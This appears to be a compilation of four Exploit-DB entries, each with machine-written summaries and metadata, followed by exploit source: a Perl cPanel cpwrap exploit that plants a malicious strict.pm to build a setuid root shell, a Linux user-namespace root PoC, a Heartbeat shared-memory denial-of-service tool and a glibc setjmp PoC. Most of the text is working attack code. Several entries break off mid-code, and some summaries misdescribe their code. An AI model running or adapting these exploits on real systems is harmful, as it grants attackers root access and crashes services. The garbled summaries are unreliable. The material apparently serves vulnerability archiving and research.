# #<-- Publish Date --># # 2006-10-01 # #<-- Technical Document Summary (TDS) --># # The script exploits a privilege escalation vulnerability in cPanel 10.8.x by invoking the MySQLAdmin tool via the cpwrap binary. It leverages a remote user check bypass and injects shell commands through the STRICT interpreter to execute arbitrary code. The affected component is the cpwrap utility within the cPanel environment on Linux systems. No successful exploitation is demonstrated in the source. # <<< # #<-- Layman's Document Summary (LDS) --># # The weakness allows an attacker to gain root privileges by manipulating system execution paths and running commands as the target user. An attacker can execute arbitrary shell commands, including launching a custom binary that creates a Maildir directory and modifies file permissions. This provides full administrative control over the affected server. # <<< # #<-- Key Words (KW) --># # cPanel 10.8.x, cpwrap, MySQLAdmin, privilege escalation, remote user bypass, setreuid, system command injection, strict.pm, Maildir, chmod, rm -f, vulnerability, local exploit, OSVDB-29122;CVE-2006-5014 # <<< # #<-- Related Terms --># # exploit, privilege escalation, remote code execution, root access, cPanel, MySQLAdmin, binary injection, system command, Linux, vulnerability classification # <<< # #<-- Entities/Attributes --># # Software: cPanel 10.8.x, cpwrap, MySQLAdmin, Linux, strict.pm, Maildir, chmod, rm -f, system, /bin/bash, /bin/echo, /usr/bin/gcc # <<< # #<-- Vulnerability Type --># # Privilege escalation via remote user bypass and command injection in cpwrap binary # METADATA: # id: 2466 # description: cPanel 10.8.x - cpwrap via MySQLAdmin Privilege Escalation # date_published: 2006-10-01 # author: Clint Torrez # type: local # platform: linux # verified: 1 # codes: OSVDB-29122;CVE-2006-5014 # <<< # #<-- Original Content --># #!/usr/bin/perl -w # 10/01/06 - cPanel <= 10.8.x cpwrap root exploit via mysqladmin # use strict; # haha oh wait.. my $cpwrap = "/usr/local/cpanel/bin/cpwrap"; my $mysqlwrap = "/usr/local/cpanel/bin/mysqlwrap"; my $pwd = `pwd`; chomp $pwd; $ENV{'PERL5LIB'} = "$pwd"; if ( ! -x "/usr/bin/gcc" ) { die "gcc: $!
"; } if ( ! -x "$cpwrap" ) { die "$cpwrap: $!
"; } if ( ! -x "$mysqlwrap" ) { die "$mysqlwrap: $!
"; } open (CPWRAP, "<$cpwrap") or die "Could not open $cpwrap: $!
"; while(<CPWRAP>) { if(/REMOTE_USER/) { die "$cpwrap is patched.
"; } } close (CPWRAP); open (STRICT, ">strict.pm") or die "Can't open strict.pm: $!
"; print STRICT "\$e = "int main(){setreuid(0,0);setregid(0,0);system(\\\"/bin/bash\\\");}";
"; print STRICT "system("/bin/echo -n \"\$e\">Maildir.c");
"; print STRICT "system("/usr/bin/gcc Maildir.c -o Maildir");
"; print STRICT "system("/bin/chmod 4755 Maildir");
"; print STRICT "system("/bin/rm -f Maildir.c strict.pm");
"; close (STRICT); system("$mysqlwrap DUMPMYSQL 2>/dev/null"); if ( -e "Maildir" ) { system("./Maildir"); } else { unlink "strict.pm"; die "Failed
"; } # milw0rm.com [2006-10-01]

// #<-- Publish Date --># // 2013-05-14 // #<-- Technical Document Summary (TDS) --># // The exploit leverages a local privilege escalation vulnerability in the Linux kernel's open-time Capability 'file_ns_capable()' function. By manipulating the file namespace capabilities through a race condition during unshare(CLONE_NEWUSER), it writes a crafted payload to /proc//uid_map and executes the zerozeroone binary with elevated privileges. The technical mechanism involves using a futex wait, setting a new user namespace, and then forking to run child code as root without proper capability checks. This allows an attacker to gain root access on the system. // #<-- Layman's Document Summary (LDS) --># // The weakness is a local privilege escalation flaw caused by improper handling of file namespace capabilities in the Linux kernel. An attacker can exploit this by creating a race condition that leads to elevated privileges when running a command as root. The exploit allows an attacker to run arbitrary commands with the privileges of the current user, potentially compromising system integrity. // #<-- Key Words (KW) --># // Linux Kernel, userns_root_sploit, zerozeroone, file_ns_capable, privilege escalation, local privilege escalation, futex, unshare, CLONE_NEWUSER, execvp, CAP_SYS_ADMIN // #<-- Related Terms --># // kernel vulnerability, user namespace, capability bounding set, race condition, root execution, Linux kernel exploit, zerozeroone binary, file map, privilege escalation technique // #<-- Entities/Attributes --># // Software: userns_root_sploit.c, Linux Kernel, zerozeroone, parent process, pid_t, int, char, buf, syscall, errno, setresuid, execvp, argv, fd, /proc, uid_map, CLONE_NEWUSER, mmap, PROT_READ, PROT_WRITE, MAP_SHARED, MAP_ANONYMOUS // #<-- Vulnerability Type --># // Local privilege escalation via race condition in file namespace capability handling // #<-- Original Content --># /* userns_root_sploit.c by */ /* Copyright (c) 2013 Andrew Lutomirski. All rights reserved. */ /* You may use, modify, and redistribute this code under the GPLv2. */ #define _GNU_SOURCE #include <unistd.h> #include <sched.h> #include <sys/types.h> #include <sys/wait.h> #include <sys/mman.h> #include <fcntl.h> #include <stdio.h> #include <string.h> #include <err.h> #include <linux/futex.h> #include <errno.h> #include <unistd.h> #include <sys/syscall.h> #ifndef CLONE_NEWUSER #define CLONE_NEWUSER 0x10000000 #endif pid_t parent; int *ftx; int childfn() { int fd; char buf[128]; if (syscall(SYS_futex, ftx, FUTEX_WAIT, 0, 0, 0, 0) == -1 && errno != EWOULDBLOCK) err(1, "futex"); sprintf(buf, "/proc/%ld/uid_map", (long)parent); fd = open(buf, O_RDWR | O_CLOEXEC); if (fd == -1) err(1, "open %s", buf); if (dup2(fd, 1) != 1) err(1, "dup2"); // Write something like "0 0 1" to stdout with elevated capabilities. execl("./zerozeroone", "./zerozeroone"); return 0; } int main(int argc, char **argv) { int dummy, status; pid_t child; if (argc < 2) { printf("usage: userns_root_sploit COMMAND ARGS...

" "This will run a command as (global) uid 0 but no capabilities.
"); return 1; } ftx = mmap(0, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (ftx == MAP_FAILED) err(1, "mmap"); parent = getpid(); if (signal(SIGCHLD, SIG_DFL) != 0) err(1, "signal"); child = fork(); if (child == -1) err(1, "fork"); if (child == 0) return childfn(); *ftx = 1; if (syscall(SYS_futex, ftx, FUTEX_WAKE, 1, 0, 0, 0) != 0) err(1, "futex"); if (unshare(CLONE_NEWUSER) != 0) err(1, "unshare(CLONE_NEWUSER)"); if (wait(&status) != child) err(1, "wait"); if

// #<-- Publish Date --># // 2006-07-27 // #<-- Technical Document Summary (TDS) --># // The program uses shared memory via the shmat system call to allocate a memory segment and copies user‑supplied input into it. An insecure default permission setting on that shared memory allows local attackers to corrupt or read arbitrary data, leading to denial of service. The vulnerability resides in Linux‑HA Heartbeat 1.2.3/2.0.x. Exploitation would cause system crash, loss of data, and resource exhaustion if critical files are accessed improperly. Not specified in source. // #<-- Layman's Document Summary (LDS) --># // Because the shared memory segment is created with default permissions that permit local access, an attacker can read or write to it without authentication, resulting in a denial of service. This issue affects the Linux Heartbeat 1.2.3/2.0.x series and could be exploited by anyone on the same system who can create or target shared memory segments. // #<-- Key Words (KW) --># // Linux-HA Heartbeat, shared memory, insecure default permissions, denial of service, local attack, CVE-2006-3815 // #<-- Related Terms --># // shared memory, denial of service, Linux HA Heartbeat, insecure permissions, system crash, intruders tiger team security // #<-- Entities/Attributes --># // Software: Linux-HA Heartbeat, Version: 1.2.3/2.0.x, Vulnerability: Insecure Default Permissions on Shared Memory, Author: anonymous, Platform: Linux, Function: shmat, File path: /proc/kcore (implied), CVE: Not specified in source // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/19186/info Since Linux-HA Heartbeat has insecure default permissions set on shared memory, local attackers may be able to cause a denial of service. Exploitation would most likely result in a system crash, loss of data, and resource exhaustion, leading to a denial of service if critical files are accessed improperly or overwritten in the attack. Other attacks may be possible as well. /* Intruders Tiger Team Security * http://www.intruders.org.br/ * * Heartbeat < 2.0.6 Insecure Shared Memory - Local Denial of Service. * * Credits: Yan Rong Ge, see link below: * http://secunia.com/advisories/21162/ * Tested on Heartbeat 2.0.5. * * Thanks for Wendel Guglielmetti, Waldemar Nehgme, * Joao Arquimedes, Ricardo BSD and Vitor, Intruders * Tiger Team Security. * * Usage: * [security@mail1 tmp]$ ipcs * * ------ Shared Memory Segments -------- * key shmid owner perms bytes nattch status * 0x00000000 1638402 root 666 7296 6 dest * * ------ Semaphore Arrays -------- * .... * Get shmid of heartbeat(look perms == 666, this is wrong!!!:)) * * [security@mail1 tmp]$ ./itts_sharedex2 1638402 "Intruders Tiger Team Security.." * * The heartbeat�s process will droped. * Brazil, July/2006. */ #include <stdio.h> #include <sys/types.h> #include <sys/ipc.h> #include <sys/shm.h> int main(int argc, char *argv[]){ int shmid; char *shm; if(argc < 2){ printf("Heartbeat Insecure Shared Memory Exploit by Nash Leon
"); printf("Usage: %s <target_shmid> <trash>
", argv[0]); exit(0); } shmid = atoi(argv[1]); if ((shm = shmat(shmid, NULL, 0)) == (char *) -1) { perror("shmat"); exit(1); } strncpy(shm,argv[2],1024); printf("Check now heartbeat pid or shared memory
"); printf("Running ps auxww | grep heartbeat or ipcs again.

"); exit(0);

// #<-- Publish Date --># // 2013-09-30 // #<-- Technical Document Summary (TDS) --># // The exploit uses a local buffer overflow vulnerability in glibc and eglibc versions 2.5/2.7/2.13. It overwrites the return address of a jmp_buf variable to redirect execution flow via a crafted function pointer. The weakness lies in an unchecked integer shift operation within the rol() function that can be manipulated by user-controlled input. Affected component: libc (glibc) on Linux systems. The exploit attempts to invoke system("/bin/sh") after hijacking control flow but does not succeed on the target system. // #<-- Layman's Document Summary (LDS) --># // The weakness is a local buffer overflow caused by improper validation of input passed to the rol() function, which processes a pointer stored in a jmp_buf structure. This allows an attacker to overwrite the return address and redirect program execution. The exploit attempts to execute a command via the system() call after hijacking control flow but fails on the reported system. // #<-- Key Words (KW) --># // glibc buffer overflow, local vulnerability, jmp_buf corruption, setjmp, longjmp, integer shift overflow, Linux x86_64, ROTATE constant, exploit proof of concept // #<-- Related Terms --># // buffer overflow, local privilege escalation, command injection, setjmp/longjmp mechanism, uninitialized return address, exploitation technique, vulnerability classification // #<-- Entities/Attributes --># // Software: glibc, eglibc, libc, Linux kernel, jmp_buf, system call, setjmp, longjmp, rol function, hacked program, POC (proof of concept), exploited binary // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># /* * * Exploit-DB Note: Reportedly does not work. See output at the bottom of the entry. * * $FILE: bug-mangle.c * * Comment: Proof of concept * * $VERSION$ * * Author: Hector Marco <hecmargi@upv.es> * Ismael Ripoll <iripoll@disca.upv.es> * * $LICENSE: * This program is free software; you can redistribute it and/or modify * it under the terms of the GNU General Public License as published by * the Free Software Foundation; either version 2 of the License, or * (at your option) any later version. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the * GNU General Public License for more details. * * You should have received a copy of the GNU General Public License * along with this program; if not, write to the Free Software * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA. */ #include <stdio.h> #include <setjmp.h> #include <stdint.h> #include <limits.h> #ifdef __i386__ #define ROTATE 0x9 #define PC_ENV_OFFSET 0x14 #elif __x86_64__ #define ROTATE 0x11 #define PC_ENV_OFFSET 0x38 #else #error The exploit does not support this architecture #endif unsigned long rol(uintptr_t value) { return (value << ROTATE) | (value >> (__WORDSIZE - ROTATE)); } int hacked(){ printf("[+] hacked !!
"); system("/bin/sh"); } int main(void){ jmp_buf env; uintptr_t *ptr_ret_env = (uintptr_t*) (((uintptr_t) env) + PC_ENV_OFFSET); printf("[+] Exploiting ...
"); if(setjmp(env) == 1){ printf("[-] Exploit failed.
